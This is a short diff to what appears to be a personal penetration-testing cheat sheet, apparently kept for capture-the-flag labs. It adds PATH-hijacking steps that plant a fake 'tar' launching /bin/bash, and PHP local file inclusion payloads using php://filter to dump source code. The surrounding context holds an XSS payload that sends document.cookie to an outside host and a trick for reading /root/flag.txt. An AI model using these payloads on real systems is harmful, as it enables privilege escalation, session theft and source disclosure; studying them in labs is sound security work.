@@ -112,7 +112,8 @@ sudo -l
 Hijack path:
 which tar
 echo "/bin/bash" > tar
-echo $
+echo $PATH
+export PATH=/tmp:$PATH
 
 Read root files with error messages (unstable):
 command_you_can_run --var-in-there="/root/flag.txt"
@@ -459,6 +460,9 @@ html
 
 "'><img src=1337xx onerror=this.src='http://10.8.10.59:8080/?'+document.cookie;>
 
+# PHP Local File Inclusion (php, lfi)
+index.php?param=php://filter/convert.base64-encode/resource=index
+url http://10.10.11.154/index.php?page=php://filter/convert.base64-encode/resource=index.php | base64 -d
 
 # XXE (XML external entities):
 In XML:
